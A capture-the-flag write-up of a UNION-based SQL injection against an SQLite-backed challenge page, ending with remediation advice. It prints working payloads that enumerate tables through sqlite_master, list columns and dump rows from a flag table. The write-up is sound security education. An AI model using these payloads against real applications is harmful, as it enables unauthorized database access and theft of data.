web application page that accepts a sector_number parameter and returns sector_details.
A UNION-based SQL injection in a sector_details query allowed disclosure of internal SQLite tables and a flagged event
The injection point is inside a single-quoted parameter. The database backend is SQLite (identified via the no such table: information_schema.tables error and the presence of sqlite_master).

# CTF Writeup — "Zion" SQL Injection (SQLite)

**Author:** Kipruto (submission)

**Target:** web application page that accepts a `sector_number` parameter and returns `sector_details`.

**Date tested:** (CTF)

**Summary:**
A UNION-based SQL injection in a `sector_details` query allowed disclosure of internal SQLite tables and a flagged event containing the CTF flag `MWR{fl4g_h3r3}`. The injection point is inside a single-quoted parameter. The database backend is **SQLite** (identified via the `no such table: information_schema.tables` error and the presence of `sqlite_master`).

---

## 1. Initial reconnaissance
* Visited the "Select a Sector" page and controlled the `sector_number` parameter.
* Observed an error when trying to query `information_schema.tables`:

Query malformed: no such table: information_schema.tables

Executed Query:
SELECT * FROM sector_details WHERE sector_number = '"Zion"' union SELECT * FROM information_schema.tables; -- -'
<img width="1053" height="616" alt="image" src="https://github.com/user-attachments/assets/bbefbb4e-13a1-42cd-9e83-4ee17f30bb32" />
* Error indicates the backend is **SQLite** (no `information_schema`). `sqlite_master` is the appropriate schema table.


## 2. Determining injection characteristics
* Confirmed the injection occurs inside a single-quoted string (payload must close the existing `'`).
* Found correct `UNION` column layout by testing with `NULL` placeholders.
* Discovered there are **5 columns** in the original `SELECT` and the **second column** is reflected in the page's output.

Example successful enumeration payload used to list tables:
' UNION SELECT NULL, group_concat(name), NULL, NULL, NULL FROM sqlite_master WHERE type='table'--
<img width="1017" height="816" alt="image" src="https://github.com/user-attachments/assets/9606c259-8925-44b0-9fde-3e1281951bf9" />
fl4gged_events,sqlite_sequence,jokes,sector_details,users

## 3. Exploitation — enumerating schema and extracting data
Because this is SQLite, `sqlite_master` and `pragma_table_info(...)` were used.
### 3.1 List tables (already discovered)
' UNION SELECT NULL, group_concat(name), NULL, NULL, NULL FROM sqlite_master WHERE type='table'--
### 3.2 List columns for a table (example: `fl4gged_events`)
' UNION SELECT NULL, group_concat(name), NULL, NULL, NULL FROM pragma_table_info('fl4gged_events')--
<img width="984" height="759" alt="image" src="https://github.com/user-attachments/assets/c4ec1b29-275c-4736-b8e0-9c0c03eec203" />

### 3.3 Count rows (example: `fl4gged_events`)
' UNION SELECT NULL, count(*), NULL, NULL, NULL FROM fl4gged_events--
<img width="993" height="770" alt="image" src="https://github.com/user-attachments/assets/e9f7984b-4141-439f-a811-be878f5a781f" />

### 3.4 Dump rows (concatenate fields)
Row-by-row extraction using `LIMIT 1 OFFSET {i}`:
' UNION SELECT NULL, (timestamp || ':' || activity), NULL, NULL, NULL FROM fl4gged_events LIMIT 1 OFFSET 0--
<img width="1016" height="819" alt="image" src="https://github.com/user-attachments/assets/9474c464-b659-4312-8405-aa651ef40318" />
' UNION SELECT NULL, (timestamp || ':' || activity), NULL, NULL, NULL FROM fl4gged_events LIMIT 1 OFFSET 1--
<img width="1017" height="847" alt="image" src="https://github.com/user-attachments/assets/26870353-b1f1-4c1c-a847-326d386cf1d4" />

## 5. Remediation and recommendations

1. **Use parameterized queries / prepared statements** — never concatenate user input into SQL statements. Bind `sector_number` as a parameter.
2. **Least privilege for DB user** — the web application should use an account with only the necessary rights and not expose metadata tables where possible.
3. **Input validation & whitelisting** — validate `sector_number` against allowed formats or IDs server-side before using it in queries.
4. **Error handling** — do not leak raw database errors to the user; use generic error messages and server-side logging for diagnostics.
5. **WAF/filters are not a replacement** — do not rely on filtering only; fix the root cause (parameterization).
6. **Output encoding / escaping** — ensure any reflected content is properly escaped/encoded to avoid information disclosure or XSS.

